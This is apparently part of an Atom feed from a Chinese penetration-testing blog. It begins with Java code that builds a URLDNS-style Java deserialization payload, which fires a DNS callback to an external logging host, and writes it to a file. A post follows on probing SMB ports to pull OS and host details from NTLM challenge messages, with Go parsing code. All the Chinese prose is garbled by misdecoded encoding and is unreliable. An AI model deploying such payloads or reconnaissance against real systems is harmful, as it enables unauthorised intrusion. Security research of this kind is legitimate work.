&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Urldns&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt; hashMap &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token class-name&quot;&gt;URL&lt;/span&gt; url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;http://333.f9575af1.dns.1433.eu.org&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token class-name&quot;&gt;Field&lt;/span&gt; f &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.net.URL&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;hashCode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;token comment&quot;&gt;//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);&lt;/span&gt;
          hashMap&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;org.apache.commons.beanutils.BeanComparator&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ObjectOutputStream&lt;/span&gt; oos &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;1.ser&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        oos&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;writeObject&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;hashMap&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;1.ser&quot;));&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;//ois.readObject();&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; clazzName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt; classPool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ClassPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDefault&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;CtClass&lt;/span&gt; ctClass &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; classPool&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;makeClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;clazzName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ctClass&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        ctClass&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;defrost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>NTLMç«¯å£ä¿¡æ¯æ¢æµ‹</title>
    <link href="https://jkme.github.io/2021/08/06/windows-ntlm-smb-scan.html"/>
    <id>https://jkme.github.io/2021/08/06/windows-ntlm-smb-scan.html</id>
    <published>2021-08-05T16:00:00.000Z</published>
    <updated>2022-01-21T03:21:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>SMBï¼ˆServer Message Blockï¼‰åè®®ï¼Œå¯ç”¨äºåœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£ç­‰ï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é å®ƒå®ç°çš„ã€‚SMBä½¿ç”¨äº†NetBIOSçš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§°APIï¼‰ã€‚å¦å¤–ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æ”¾æ€§çš„åè®®ï¼Œå…è®¸äº†åè®®æ‰©å±•â€”â€”ä½¿å¾—å®ƒå˜å¾—æ›´å¤§è€Œä¸”å¤æ‚ï¼›å¤§çº¦æœ‰65ä¸ªæœ€ä¸Šå±‚çš„ä½œä¸šï¼Œè€Œæ¯ä¸ªä½œä¸šéƒ½è¶…è¿‡120ä¸ªå‡½æ•°ï¼Œç”šè‡³Windows NTä¹Ÿæ²¡æœ‰å…¨éƒ¨æ”¯æŒåˆ°ï¼Œæœ€è¿‘å¾®è½¯åˆæŠŠ SMB æ”¹åä¸º CIFSï¼ˆCommon Internet File Systemï¼‰ï¼Œå¹¶ä¸”åŠ å…¥äº†è®¸å¤šæ–°çš„ç‰¹è‰²ã€‚SMBåè®®ä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º139ï¼Œ445ï¼ŒCIFSåè®®æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼šSMBã€SMB2ã€SMB3ã€‚</p><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>åœ¨type2è¿”å›Challengeçš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶è¿”å›äº†æ“ä½œç³»ç»Ÿç±»å‹ï¼Œä¸»æœºåï¼Œnetbiosåç­‰ç­‰ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬åœ¨èƒ½è·ŸæœåŠ¡å™¨è¿›è¡ŒNTLMäº¤æµä¸­ï¼Œç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªtype1çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›type2çš„å“åº”ï¼Œè¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¾ˆå¤šä¿¡æ¯ã€‚SMBv1å’ŒSMBv2çš„æ•°æ®åŒ…ç»“æ„æ˜¯ä¸åŒçš„</p><h3 id="SMBv1"><a href="#SMBv1" class="headerlink" title="SMBv1"></a>SMBv1</h3><p>ä½¿ç”¨<a href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a>æ¢æµ‹SMBæ¥å£ï¼ŒæŠ“åŒ…é€šè¿‡wiresharkåˆ†æï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿç±»å‹çš„æ•°æ®åŒ…ç”±SMB Headerå’ŒResponseç»„æˆï¼š<br><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png"><br>æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–smbæ•°æ®åŒ…çš„NTLMæ•°æ®ï¼Œç„¶åå¯¹NTLMæ•°æ®åŒ…è§£æï¼ŒNTLMæ•°æ®åŒ…ä¸Šä¸€å±‚æ˜¯GSS-APIï¼Œé¦–å…ˆæ‰¾åˆ°GSS-APIåœ¨æ•´ä¸ªæ•°æ®åŒ…çš„åç§»é‡ï¼ŒSMBçš„æ•°æ®åŒ…ç»“æ„é•¿åº¦å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">SMB Header:  32 byteWord Count:  1 byteAndXCommand: 1 byteReserved:    1 byteAndXOffset:  2 byteAction:    2 byteSecurity Blob Length: 2 byte (è¡¨ç¤ºSecurity Blobçš„é•¿åº¦ï¼Œè¿™é‡Œçš„hexæ˜¯ 0f 10ï¼Œå°ç«¯è½¬æ¢ä¸º010f,å†è½¬æ¢æˆ10è¿›åˆ¶å°±æ˜¯271ï¼Œå¯¹åº”Security Blobçš„é•¿åº¦)Byte Count: 2 byte (è¡¨ç¤ºSecurity BlobåŠ ä¸ŠNativeOSå’ŒNative Lançš„é•¿åº¦)Security Blob: å¯å˜é•¿åº¦ï¼Œå–å†³äºSecurity Blob Length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢çš„æ•°æ®åŒ…ç»“æ„çš„å…³é”®æ•°æ®æ˜¯<code>Security Blob Length</code>å’Œ<code>Byte Content</code>ï¼Œå‰è€…è¡¨ç¤ºGSS-APIçš„æ•´ä¸ªæ•°æ®åŒ…é•¿åº¦ï¼Œåè€…è¡¨ç¤ºGSS-APIå’ŒNative OSåŠ ä¸ŠNative LMçš„æ•°æ®é•¿åº¦ï¼š</p><h6 id="GSS-APIçš„é•¿åº¦æ˜¯271-Byte"><a href="#GSS-APIçš„é•¿åº¦æ˜¯271-Byte" class="headerlink" title="GSS-APIçš„é•¿åº¦æ˜¯271 Byte"></a>GSS-APIçš„é•¿åº¦æ˜¯271 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png"></p><h6 id="Native-OSçš„é•¿åº¦æ˜¯42-Byte"><a href="#Native-OSçš„é•¿åº¦æ˜¯42-Byte" class="headerlink" title="Native OSçš„é•¿åº¦æ˜¯42 Byte"></a>Native OSçš„é•¿åº¦æ˜¯42 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.1.png"></p><h6 id="Native-LMçš„é•¿åº¦æ˜¯38-Byte"><a href="#Native-LMçš„é•¿åº¦æ˜¯38-Byte" class="headerlink" title="Native LMçš„é•¿åº¦æ˜¯38 Byte"></a>Native LMçš„é•¿åº¦æ˜¯38 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.2.png"></p><p>æ‰€ä»¥æ•°å­¦é¢˜æ¥äº†ï¼š<br>Security Blob Lengthè½¬æ¢æˆ10è¿›åˆ¶æ˜¯271 Byte</p><p>Byte Count: 271 + 42 + 38 = 351 Byte<br>æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–NTLMçš„æ•°æ®å’ŒNativeOSå’ŒNative LMï¼Œå›åˆ°ä»£ç é‡Œé¢å»çœ‹çœ‹ï¼Œå½“æˆ‘ä»¬è·å–åˆ°type2çš„æ•°æ®ï¼Œè·å–åˆ°çš„æ•°æ®æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-4.png"></p><p>NetBIOS Session Serviceè¿™ä¸€å±‚çš„é•¿åº¦æ˜¯4 Byteï¼Œ<code>Security Blob Length</code>çš„åç§»é‡å°±å‡ºæ¥äº†: </p><pre class="line-numbers language-none"><code class="language-none">4 + 32 + 1 + 1 + 1 + 2 + 2 &#x3D; 43<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥<code>Security Blob Length</code>åç§»ä»43å¼€å§‹ï¼Œé•¿åº¦æ˜¯2 Byteï¼Œ <code>Security Blob</code>è·Ÿåœ¨åé¢ï¼Œåç§»ä»45å¼€å§‹ï¼Œ47ç»“æŸï¼Œgoè¯­è¨€ä¼ªä»£ç ï¼š</p><pre class="line-numbers language-none"><code class="language-none">blob_length :&#x3D; uint16(bytes2Uint(ret[43:45], &#39;&lt;&#39;))blob_count :&#x3D; uint16(bytes2Uint(ret[45:47], &#39;&lt;&#39;))&#x2F;&#x2F;gsså˜é‡è¡¨ç¤ºä»Security Blobèµ·å§‹ä½ç½®åˆ°æ•°æ®åŒ…ç»“æŸï¼ŒåŒ…æ‹¬äº†Native OSå’ŒNative LMgss :&#x3D; ret[47:]&#x2F;&#x2F;æ‰¾åˆ°NTLMSSPåœ¨gssçš„åç§»èµ·å§‹ä½ç½®off_ntlm :&#x3D; bytes.Index(gss, []byte(&quot;NTLMSSP&quot;))&#x2F;&#x2F;Native OSå’ŒNative LMæ•°æ®ï¼Œå¯¹åº”ä¸Šé¢çš„å›¾native :&#x3D; gss[int(blob_length):blob_count]&#x2F;&#x2F;bsè¡¨ç¤ºntlmçš„æ•°æ®ï¼Œä»¥NTLMSSPå¼€å¤´bs :&#x3D; gss[off_ntlm:blob_length]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥ä¸»è¦å·¥ä½œå°±æ˜¯è§£æNTLMçš„æ•°æ®ï¼Œæ„Ÿè°¢iv4nå¸ˆå‚…çš„<a href="http://iv4n.cc/ntlmssp/">Windows NTLMåè®®ç»†èŠ‚</a>ï¼Œæˆ‘forkäº†ä¸€ä»½<a href="https://github.com/JKme/go-ntlmssp">go-ntlmssp</a>ï¼Œå¢åŠ äº†è§£æNTLMè¾“å‡ºå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥è·å–NTLMSSPæ•°æ®çš„è§£æç»“æœï¼š</p><pre class="line-numbers language-none"><code class="language-none">func TestChallengeMsg_String(t *testing.T) &#123;bs, _ :&#x3D; hex.DecodeString(&quot;4e544c4d535350xxxxx&quot;)type2 :&#x3D; ChallengeMsg&#123;&#125;info :&#x3D; type2.String(bs)fmt.Println(info)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-5.png"></p><p>Windows10é»˜è®¤ä½¿ç”¨SMBv2åè®®ï¼Œæ²¡æœ‰æ‰“å¼€SMBv1å¼€å…³ï¼Œ<a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcollå¸ˆå‚…çš„SharpDetectionNTLMSSP</a>åªå‘é€äº†SMBv1çš„æ¢æµ‹ï¼Œæ²¡æœ‰æ¢æµ‹SMBv2ã€‚<a href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a>å¸ˆå‚…å°±æ¯”è¾ƒå®Œæ•´ï¼Œå…ˆæ¢æµ‹SMBv1ï¼Œå¤±è´¥ä¹‹åå°è¯•SMBv2ã€‚</p><h3 id="SMBv2"><a href="#SMBv2" class="headerlink" title="SMBv2"></a>SMBv2</h3><p>å‚è€ƒ<a href="https://github.com/FeigongSec/NTLMINFO/blob/016e1859b7c0f4cc55c923027bc24174b0586bc7/SmbInfo/SmbInfo/Program.cs#L83">éæ”»å¸ˆå‚…çš„ä»£ç </a>ï¼Œå…ˆå‘é€ç¬¬ä¸€æ¬¡çš„æ¢æµ‹è¯·æ±‚ï¼Œæ‰¾åˆ°åç§»é‡70çš„åœ°æ–¹ï¼Œåšä¸€æ¬¡åˆ¤æ–­æ˜¯å¦å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…ã€‚æ¢æˆGOä»£ç å°±æ¯”è¾ƒç®€å•äº†ï¼Œè¿™é‡Œçš„åç§»70ä¿å­˜çš„æ˜¯æ˜¯SMBv2çš„<code>Security mode</code>:</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-6.png"></p><p>Goè¯­è¨€å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">var NTLMSSPNegotiatev2Data []byteif hex.EncodeToString(r2[70:71]) &#x3D;&#x3D; &quot;03&quot; &#123;flags :&#x3D; []byte&#123;0x15, 0x82, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125; else &#123;flags :&#x3D; []byte&#123;0x05, 0x80, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125;_, err &#x3D; conn2.Write(NegotiateSMBv2Data2)if err !&#x3D; nil &#123;return&#125;readBytes(conn2)_, err &#x3D; conn2.Write(NTLMSSPNegotiatev2Data)ret, _ :&#x3D; readBytes(conn2)ntlmOff :&#x3D; bytes.Index(ret, []byte(&quot;NTLMSSP&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆå“ä¸»è¦å‚è€ƒéæ”»å¸ˆå‚…çš„ä»£ç ï¼Œé›†æˆåˆ°<a href="https://github.com/JKme/cube">Cube</a>ï¼Œå®Œæˆäº†winrmã€wmiã€smbã€mssqlç«¯å£çš„NTLMä¿¡æ¯æ¢æµ‹ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a></li><li><a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcollå¸ˆå‚…çš„SharpDetectionNTLMSSP</a></li><li><a href="https://github.com/zmap/zgrab2/tree/master/lib/smb/smb">An SMB library in Go</a></li><li><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4">NTLMåŸºç¡€ä»‹ç»</a></li><li><a href="http://iv4n.cc/ntlmssp/">Windows NTLMåè®®ç»†èŠ‚</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688">Server Message Block (SMB) Protocol</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962">Server Message Block (SMB) Protocol Versions 2 and 3</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;SMBï¼ˆServer Message Blockï¼‰åè®®ï¼Œå¯ç”¨äºåœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£ç­‰ï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é å®ƒå®ç°çš„ã€‚SMBä½¿ç”¨äº†NetBIOSçš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§°APIï¼‰ã€‚å¦å¤–ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æ”¾æ€§çš„åè®®ï¼Œå…è®¸äº†åè®®æ‰©å±•â€”â€”ä½¿å¾—å®ƒå˜å¾—æ›´å¤§è€Œä¸”å¤æ‚ï¼›å¤§çº¦æœ‰65ä¸ªæœ€ä¸Šå±‚çš„ä½œä¸šï¼Œè€Œæ¯ä¸ªä½œä¸šéƒ½è¶…è¿‡120ä¸ªå‡½æ•°ï¼Œç”šè‡³Windows NTä¹Ÿæ²¡æœ‰å…¨éƒ¨æ”¯æŒåˆ°ï¼Œæœ€è¿‘å¾®è½¯åˆæŠŠ SMB æ”¹åä¸º CIFSï¼ˆCommon Internet File Systemï¼‰ï¼Œå¹¶ä¸”åŠ å…¥äº†è®¸å¤šæ–°çš„ç‰¹è‰²ã€‚SMBåè®®ä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º139ï¼Œ445ï¼ŒCIFSåè®®æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼šSMBã€SMB2ã€SMB3ã€‚&lt;/p&gt;
&lt;h3 id=&quot;NTLM&quot;&gt;&lt;a href=&quot;#NTLM&quot; class=&quot;headerlink&quot; title=&quot;NTLM&quot;&gt;&lt;/a&gt;NTLM&lt;/h3&gt;&lt;p&gt;åœ¨type2è¿”å›Challengeçš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶è¿”å›äº†æ“ä½œç³»ç»Ÿç±»å‹ï¼Œä¸»æœºåï¼Œnetbiosåç­‰ç­‰ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬åœ¨èƒ½è·ŸæœåŠ¡å™¨è¿›è¡ŒNTLMäº¤æµä¸­ï¼Œç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªtype1çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›type2çš„å“åº”ï¼Œè¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¾ˆå¤šä¿¡æ¯ã€‚SMBv1å’ŒSMBv2çš„æ•°æ®åŒ…ç»“æ„æ˜¯ä¸åŒçš„&lt;/p&gt;
&lt;h3 id=&quot;SMBv1&quot;&gt;&lt;a href=&quot;#SMBv1&quot; class=&quot;headerlink&quot; title=&quot;SMBv1&quot;&gt;&lt;/a&gt;SMBv1&lt;/h3&gt;&lt;p&gt;ä½¿ç”¨&lt;a href=&quot;https://github.com/FeigongSec/NTLMINFO&quot;&gt;éæ”»NTLMINFO&lt;/a&gt;æ¢æµ‹SMBæ¥å£ï¼ŒæŠ“åŒ…é€šè¿‡wiresharkåˆ†æï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿç±»å‹çš„æ•°æ®åŒ…ç”±SMB Headerå’ŒResponseç»„æˆï¼š&lt;br&gt;&lt;img src=&quot;/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png&quot;&gt;&lt;br&gt;æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–smbæ•°æ®åŒ…çš„NTLMæ•°æ®ï¼Œç„¶åå¯¹NTLMæ•°æ®åŒ…è§£æï¼ŒNTLMæ•°æ®åŒ…ä¸Šä¸€å±‚æ˜¯GSS-APIï¼Œé¦–å…ˆæ‰¾åˆ°GSS-APIåœ¨æ•´ä¸ªæ•°æ®åŒ…çš„åç§»é‡ï¼ŒSMBçš„æ•°æ®åŒ…ç»“æ„é•¿åº¦å¦‚ä¸‹ï¼š&lt;/p&gt;
